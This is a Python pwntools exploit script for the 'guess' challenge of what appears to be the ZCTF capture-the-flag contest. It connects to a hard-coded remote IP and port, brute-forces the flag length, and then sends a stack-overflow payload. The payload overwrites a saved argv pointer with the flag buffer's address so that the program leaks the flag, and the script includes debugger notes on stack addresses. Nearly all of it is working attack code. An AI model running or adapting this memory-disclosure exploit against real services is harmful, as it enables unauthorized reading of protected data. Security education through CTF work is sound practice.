#from zio import *
from pwn import *
#target = "./guess"
target = ("115.28.27.103", 22222)

def get_io(target):
	#r_m = COLORED(RAW, "green")
	#w_m = COLORED(RAW, "blue")
	#io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
	#io = process(target, timeout = 9999)
	io = remote("115.28.27.103", 22222, timeout = 9999)
	return  io 

def leak_len(io, length):
	io.readuntil("please guess the flag:\n")
	flag_addr = 0x6010C0
	payload = 'a' * length + "\x00"
	#io.gdb_hint()
	io.writeline(payload)

	result = io.readuntil("\n")
	print result
	#io.close(0)
	if "len error" in result:
		return False
	return True



def pwn(io):
	#io.read_until("please guess the flag:\n")
	io.readuntil("please guess the flag:\n")
	"""
	[stack] : 0x7fffff422210 --> 0x73736575672f2e (b'./guess')
	!![stack] : 0x7fffff421278 --> 0x7fffff422210 --> 0x73736575672f2e (b'./guess')

	[stack] : 0x7fffff422ff0 --> 0x73736575672f2e (b'./guess')
	!![stack] : 0x7fffff4215e0 --> 0x7fffff422ff0 --> 0x73736575672f2e (b'./guess')

	[stack] : 0x7fffc0eb7bfa --> 0x73736575672f6e (b'n/guess')
	[stack] : 0x7fffc0eb7ff0 --> 0x73736575672f2e (b'./guess')
	!![stack] : 0x7fffc0eb6c48 --> 0x7fffc0eb7ff0 --> 0x73736575672f2e (b'./guess')

	arg[0]: 0x7fffc0eb67c0 ('a' <repeats 15 times>...)
	"""
	flag_addr = 0x6010C0 + 5 #+ 3 + 6

	length = 34

	payload = "ZCTF{"
	payload = payload.ljust(length, 'b')
	payload += "\x00"
	payload = payload.ljust(0x7fffff421278 - 0x7fffff421150, 'a')
	#payload = payload.ljust(0x100, 'a')
	payload += p64(flag_addr)
	#payload = 'a' * (0x7fffc0eb68e8 - 0x7fffc0eb67c0) + p64(flag_addr)
	raw_input()
	#io.gdb_hint()
	#io.writeline(payload)
	#payload = 'a' * 0x50
	io.writeline(payload)

	#io.interact()
	io.interactive()

"""
#leak length = 9
for i in range(32, 256):
	print i
	io = get_io(target)
	if leak_len(io, i) == True:
		break
exit(0)
"""

io = get_io(target)
pwn(io)

